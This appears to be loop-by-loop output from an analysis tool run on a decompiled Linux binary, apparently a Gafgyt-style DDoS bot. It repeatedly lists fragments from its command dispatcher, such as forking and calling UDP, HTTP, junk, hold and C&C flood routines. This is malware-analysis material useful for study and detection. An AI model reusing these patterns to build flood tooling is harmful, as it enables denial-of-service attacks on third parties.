++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v233, v240, v241);
		sendSTD(v233, (int16_t)v240, v241);
		sendHOLD(v233, v240, v241);
		__libc_close(v133);
=============================WHILE LOOPS ID : 110 @ processCmd ====================================
++++++++ WHILE START : 19125 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19134 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v254, (int16_t)v251, v252);
=============================WHILE LOOPS ID : 111 @ processCmd ====================================
++++++++ WHILE START : 19182 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19192 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v230, v227, v228);
		__libc_close(v133);
=============================WHILE LOOPS ID : 112 @ processCmd ====================================
++++++++ WHILE START : 19240 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19249 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v254, (int16_t)v251, v252);
=============================WHILE LOOPS ID : 113 @ processCmd ====================================
++++++++ WHILE START : 19293 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19305 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v233, v240, v241);
		sendSTD(v233, (int16_t)v240, v241);
		sendHOLD(v233, v240, v241);
		__libc_close(v133);
=============================WHILE LOOPS ID : 114 @ processCmd ====================================
++++++++ WHILE START : 19347 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19356 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v254, (int16_t)v251, v252);
=============================WHILE LOOPS ID : 115 @ processCmd ====================================
++++++++ WHILE START : 19402 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19414 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
=============================WHILE LOOPS ID : 116 @ processCmd ====================================
++++++++ WHILE START : 19468 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19477 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v254, (int16_t)v251, v252);
=============================WHILE LOOPS ID : 117 @ processCmd ====================================
++++++++ WHILE START : 19521 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19533 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v233, v240, v241);
		sendSTD(v233, (int16_t)v240, v241);
		sendHOLD(v233, v240, v241);
		__libc_close(v133);
=============================WHILE LOOPS ID : 118 @ processCmd ====================================
++++++++ WHILE START : 19575 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19584 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v254, (int16_t)v251, v252);
=============================WHILE LOOPS ID : 119 @ processCmd ====================================
++++++++ WHILE START : 19632 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19642 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v230, v227, v228);
		__libc_close(v133);
=============================WHILE LOOPS ID : 120 @ processCmd ====================================
++++++++ WHILE START : 19690 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19699 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v254, (int16_t)v251, v252);
=============================WHILE LOOPS ID : 121 @ processCmd ====================================
++++++++ WHILE START : 19743 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19755 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v233, v240, v241);
		sendSTD(v233, (int16_t)v240, v241);
		sendHOLD(v233, v240, v241);
		__libc_close(v133);
=============================WHILE LOOPS ID : 122 @ processCmd ====================================
++++++++ WHILE START : 19797 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19806 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v254, (int16_t)v251, v252);
=============================WHILE LOOPS ID : 123 @ processCmd ====================================
++++++++ WHILE START : 19884 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19893 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v254, (int16_t)v251, v252);
=============================WHILE LOOPS ID : 124 @ processCmd ====================================
++++++++ WHILE START : 19930 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19942 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v233, v240, v241);
		sendSTD(v233, (int16_t)v240, v241);
		sendHOLD(v233, v240, v241);
		__libc_close(v133);
=============================WHILE LOOPS ID : 125 @ processCmd ====================================
++++++++ WHILE START : 19974 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19983 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v254, (int16_t)v251, v252);
=============================WHILE LOOPS ID : 126 @ processCmd ====================================
++++++++ WHILE START : 20024 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20034 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v230, v227, v228);
		__libc_close(v133);
=============================WHILE LOOPS ID : 127 @ processCmd ====================================
++++++++ WHILE START : 20069 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20081 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v233, v240, v241);
		sendSTD(v233, (int16_t)v240, v241);
		sendHOLD(v233, v240, v241);
		__libc_close(v133);
=============================WHILE LOOPS ID : 128 @ processCmd ====================================
++++++++ WHILE START : 20117 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20129 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
=============================WHILE LOOPS ID : 129 @ processCmd ====================================
++++++++ WHILE START : 20170 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20182 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v233, v240, v241);
		sendSTD(v233, (int16_t)v240, v241);
		sendHOLD(v233, v240, v241);
		__libc_close(v133);
=============================WHILE LOOPS ID : 130 @ processCmd ====================================
++++++++ WHILE START : 20216 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20226 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v230, v227, v228);
		__libc_close(v133);
=============================WHILE LOOPS ID : 131 @ processCmd ====================================
++++++++ WHILE START : 20261 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20273 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v233, v240, v241);
		sendSTD(v233, (int16_t)v240, v241);
		sendHOLD(v233, v240, v241);
		__libc_close(v133);
=============================WHILE LOOPS ID : 132 @ processCmd ====================================
++++++++ WHILE START : 20332 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20349 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendJUNK(v312, v162, v163);
		__libc_close(v133);
=============================WHILE LOOPS ID : 133 @ processCmd ====================================
++++++++ WHILE START : 20411 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20423 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v233, v240, v241);
		sendSTD(v233, (int16_t)v240, v241);
		sendHOLD(v233, v240, v241);
		__libc_close(v133);
=============================WHILE LOOPS ID : 134 @ processCmd ====================================
++++++++ WHILE START : 20464 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20474 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v230, v227, v228);
		__libc_close(v133);
=============================WHILE LOOPS ID : 135 @ processCmd ====================================
++++++++ WHILE START : 20519 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20531 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v233, v240, v241);
		sendSTD(v233, (int16_t)v240, v241);
		sendHOLD(v233, v240, v241);
		__libc_close(v133);
=============================WHILE LOOPS ID : 136 @ processCmd ====================================
++++++++ WHILE START : 20570 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20582 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
=============================WHILE LOOPS ID : 137 @ processCmd ====================================
++++++++ WHILE START : 20633 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20645 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v233, v240, v241);
		sendSTD(v233, (int16_t)v240, v241);
		sendHOLD(v233, v240, v241);
		__libc_close(v133);
=============================WHILE LOOPS ID : 138 @ processCmd ====================================
++++++++ WHILE START : 20686 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20696 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v230, v227, v228);
		__libc_close(v133);
=============================WHILE LOOPS ID : 139 @ processCmd ====================================
++++++++ WHILE START : 20741 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20753 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v233, v240, v241);
		sendSTD(v233, (int16_t)v240, v241);
		sendHOLD(v233, v240, v241);
		__libc_close(v133);
=============================WHILE LOOPS ID : 140 @ processCmd ====================================
++++++++ WHILE START : 20842 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20851 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v191, v172, v173, v174, v175, v148);
=============================WHILE LOOPS ID : 141 @ processCmd ====================================
++++++++ WHILE START : 20908 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20920 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v233, v240, v241);
		sendSTD(v233, (int16_t)v240, v241);
		sendHOLD(v233, v240, v241);
		__libc_close(v133);
=============================WHILE LOOPS ID : 142 @ processCmd ====================================
++++++++ WHILE START : 20961 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20971 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v230, v227, v228);
		__libc_close(v133);
=============================WHILE LOOPS ID : 143 @ processCmd ====================================
++++++++ WHILE START : 21016 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21028 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v233, v240, v241);
		sendSTD(v233, (int16_t)v240, v241);
		sendHOLD(v233, v240, v241);
		__libc_close(v133);
=============================WHILE LOOPS ID : 144 @ processCmd ====================================
++++++++ WHILE START : 21067 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21079 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
=============================WHILE LOOPS ID : 145 @ processCmd ====================================
++++++++ WHILE START : 21130 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21142 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v233, v240, v241);
		sendSTD(v233, (int16_t)v240, v241);
		sendHOLD(v233, v240, v241);
		__libc_close(v133);
=============================WHILE LOOPS ID : 146 @ processCmd ====================================
++++++++ WHILE START : 21183 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21193 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v230, v227, v228);
		__libc_close(v133);
=============================WHILE LOOPS ID : 147 @ processCmd ====================================
++++++++ WHILE START : 21238 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21250 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v233, v240, v241);
		sendSTD(v233, (int16_t)v240, v241);
		sendHOLD(v233, v240, v241);
		__libc_close(v133);
=============================WHILE LOOPS ID : 148 @ processCmd ====================================
++++++++ WHILE START : 21335 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21347 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v233, v240, v241);
		sendSTD(v233, (int16_t)v240, v241);
		sendHOLD(v233, v240, v241);
		__libc_close(v133);
=============================WHILE LOOPS ID : 149 @ processCmd ====================================
++++++++ WHILE START : 21381 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21391 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v230, v227, v228);
		__libc_close(v133);
=============================WHILE LOOPS ID : 150 @ processCmd ====================================
++++++++ WHILE START : 21426 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21438 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v233, v240, v241);
		sendSTD(v233, (int16_t)v240, v241);
		sendHOLD(v233, v240, v241);
		__libc_close(v133);
=============================WHILE LOOPS ID : 151 @ processCmd ====================================
++++++++ WHILE START : 21474 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21486 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
=============================WHILE LOOPS ID : 152 @ processCmd ====================================
++++++++ WHILE START : 21518 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21528 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v230, v227, v228);
		__libc_close(v133);
=============================WHILE LOOPS ID : 153 @ processCmd ====================================
++++++++ WHILE START : 21597 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21606 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v191, v172, v173, v174, v175, v148);
=============================WHILE LOOPS ID : 154 @ processCmd ====================================
++++++++ WHILE START : 21644 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21654 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v230, v227, v228);
		__libc_close(v133);
=============================WHILE LOOPS ID : 155 @ processCmd ====================================
++++++++ WHILE START : 21683 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21695 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
=============================WHILE LOOPS ID : 156 @ processCmd ====================================
++++++++ WHILE START : 21727 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21737 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v230, v227, v228);
		__libc_close(v133);
=============================WHILE LOOPS ID : 157 @ processCmd ====================================
++++++++ WHILE START : 21796 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21812 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendHOLD(v314, v158, v159);
=============================WHILE LOOPS ID : 158 @ processCmd ====================================
++++++++ WHILE START : 21871 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21881 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v230, v227, v228);
		__libc_close(v133);
=============================WHILE LOOPS ID : 159 @ processCmd ====================================
++++++++ WHILE START : 21913 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21925 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
=============================WHILE LOOPS ID : 160 @ processCmd ====================================
++++++++ WHILE START : 21967 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21977 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v230, v227, v228);
		__libc_close(v133);
=============================WHILE LOOPS ID : 161 @ processCmd ====================================
++++++++ WHILE START : 22059 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22068 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v191, v172, v173, v174, v175, v148);
=============================WHILE LOOPS ID : 162 @ processCmd ====================================
++++++++ WHILE START : 22116 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22126 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v230, v227, v228);
		__libc_close(v133);
=============================WHILE LOOPS ID : 163 @ processCmd ====================================
++++++++ WHILE START : 22158 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22170 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
=============================WHILE LOOPS ID : 164 @ processCmd ====================================
++++++++ WHILE START : 22212 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22222 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v230, v227, v228);
		__libc_close(v133);
=============================WHILE LOOPS ID : 165 @ processCmd ====================================
++++++++ WHILE START : 22276 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22286 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v187, v162, v163);
		__libc_close(v133);
=============================WHILE LOOPS ID : 166 @ processCmd ====================================
++++++++ WHILE START : 22340 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22350 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v230, v227, v228);
		__libc_close(v133);
=============================WHILE LOOPS ID : 167 @ processCmd ====================================
++++++++ WHILE START : 22382 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22394 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
=============================WHILE LOOPS ID : 168 @ processCmd ====================================
++++++++ WHILE START : 22436 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22446 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v230, v227, v228);
		__libc_close(v133);
=============================WHILE LOOPS ID : 169 @ processCmd ====================================
++++++++ WHILE START : 22528 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22537 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v191, v172, v173, v174, v175, v148);
=============================WHILE LOOPS ID : 170 @ processCmd ====================================
++++++++ WHILE START : 22585 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22595 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v230, v227, v228);
		__libc_close(v133);
=============================WHILE LOOPS ID : 171 @ processCmd ====================================
++++++++ WHILE START : 22627 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22639 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
=============================WHILE LOOPS ID : 172 @ processCmd ====================================
++++++++ WHILE START : 22681 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22691 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v230, v227, v228);
		__libc_close(v133);
=============================WHILE LOOPS ID : 173 @ processCmd ====================================
++++++++ WHILE START : 22773 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22783 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v230, v227, v228);
		__libc_close(v133);
=============================WHILE LOOPS ID : 174 @ processCmd ====================================
++++++++ WHILE START : 22812 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22824 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
=============================WHILE LOOPS ID : 175 @ processCmd ====================================
++++++++ WHILE START : 22856 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22866 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v230, v227, v228);
		__libc_close(v133);
=============================WHILE LOOPS ID : 176 @ processCmd ====================================
++++++++ WHILE START : 22935 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22944 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v191, v172, v173, v174, v175, v148);
=============================WHILE LOOPS ID : 177 @ processCmd ====================================
++++++++ WHILE START : 22971 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22983 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
=============================WHILE LOOPS ID : 178 @ processCmd ====================================
++++++++ WHILE START : 23026 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23036 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v187, v162, v163);
		__libc_close(v133);
=============================WHILE LOOPS ID : 179 @ processCmd ====================================
++++++++ WHILE START : 23069 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23081 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
=============================WHILE LOOPS ID : 180 @ processCmd ====================================
++++++++ WHILE START : 23143 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23152 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v191, v172, v173, v174, v175, v148);
=============================WHILE LOOPS ID : 181 @ processCmd ====================================
++++++++ WHILE START : 23179 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23191 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
=============================WHILE LOOPS ID : 182 @ processCmd ====================================
++++++++ WHILE START : 23313 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23325 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
=============================WHILE LOOPS ID : 183 @ processCmd ====================================
++++++++ WHILE START : 23387 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23396 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v191, v172, v173, v174, v175, v148);
=============================WHILE LOOPS ID : 184 @ processCmd ====================================
++++++++ WHILE START : 23423 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23435 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
=============================WHILE LOOPS ID : 185 @ processCmd ====================================
++++++++ WHILE START : 23478 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23488 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v187, v162, v163);
		__libc_close(v133);
=============================WHILE LOOPS ID : 186 @ processCmd ====================================
++++++++ WHILE START : 23521 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23533 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
=============================WHILE LOOPS ID : 187 @ processCmd ====================================
++++++++ WHILE START : 23595 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23604 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v191, v172, v173, v174, v175, v148);
=============================WHILE LOOPS ID : 188 @ processCmd ====================================
++++++++ WHILE START : 23631 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23643 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
=============================WHILE LOOPS ID : 189 @ processCmd ====================================
++++++++ WHILE START : 23693 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23702 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHOLD(v185, v158, v159);
=============================WHILE LOOPS ID : 190 @ processCmd ====================================
++++++++ WHILE START : 23741 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23753 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
=============================WHILE LOOPS ID : 191 @ processCmd ====================================
++++++++ WHILE START : 23815 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23824 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v191, v172, v173, v174, v175, v148);
=============================WHILE LOOPS ID : 192 @ processCmd ====================================
++++++++ WHILE START : 23851 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23863 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
=============================WHILE LOOPS ID : 193 @ processCmd ====================================
++++++++ WHILE START : 23906 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23916 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v187, v162, v163);
		__libc_close(v133);
=============================WHILE LOOPS ID : 194 @ processCmd ====================================
++++++++ WHILE START : 23949 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23961 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
=============================WHILE LOOPS ID : 195 @ processCmd ====================================
++++++++ WHILE START : 24023 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24032 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v191, v172, v173, v174, v175, v148);
=============================WHILE LOOPS ID : 196 @ processCmd ====================================
++++++++ WHILE START : 24059 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24071 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
=============================WHILE LOOPS ID : 197 @ getOurIP ====================================
++++++++ WHILE START : 24465 
++++++++ WHILE FUNCTION : getOurIP 
++++++++ WHILE END : 24545 
++++++++ INTRESTING INSTRUCTIONS :  
		if (strstr(v141, "\t00000000\t") == 0) {
		if (fdgets(v141, 0x1000, v139) == 0) {
		__libc_close(v139);
		__libc_close(v132);
		__libc_close(v132);
		__libc_close(v139);
		__libc_close(v132);
		__libc_close(v132);
=============================WHILE LOOPS ID : 198 @ main ====================================
++++++++ WHILE START : 24913 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 25328 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() != 0) {
		while (true) {
		if (initConnection() == 0) {
		getBuild();
		__GI_inet_ntoa(v148);
		HackerPrint(v148, 1);
		while (true) {
		while (true) {
		while (true) {
		if (recvLine() == -1) {
		while (true) {
		v171 = __libc_waitpid(v164, v161, v163);
		while (true) {
		while (true) {
		free(0);
		if (strstr(v169, (char *)&v177) != v156) {
		int32_t v178 = strstr(v169, (char *)&v177); // 0x805102c
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		processCmd();
		free(v216);
		free(v216);
		while (true) {
		while (true) {
		processCmd();
		if (listFork() != 0) {
		szprintf(5, (int32_t)"MOVE", v186, v186);
		int32_t v218 = fdpopen(); // 0x805122a
		while (true) {
		if (fdgets(v218, v158, v127) != 0) {
		fdpclose();
		HackerPrint(v169, (int32_t)&v177);
		while (true) {
		v171 = __libc_waitpid(v164, v161, v163);
		getBuild();
		__GI_inet_ntoa(v148);
		HackerPrint(v148, 1);
=============================WHILE LOOPS ID : 199 @ main ====================================
++++++++ WHILE START : 25350 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 25356 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 203 @ _vfprintf_internal ====================================
++++++++ WHILE START : 31409 
++++++++ WHILE FUNCTION : _vfprintf_internal 
++++++++ WHILE END : 32070 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 206 @ _ppfs_parsespec ====================================
++++++++ WHILE START : 33030 
++++++++ WHILE FUNCTION : _ppfs_parsespec 
++++++++ WHILE END : 33943 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
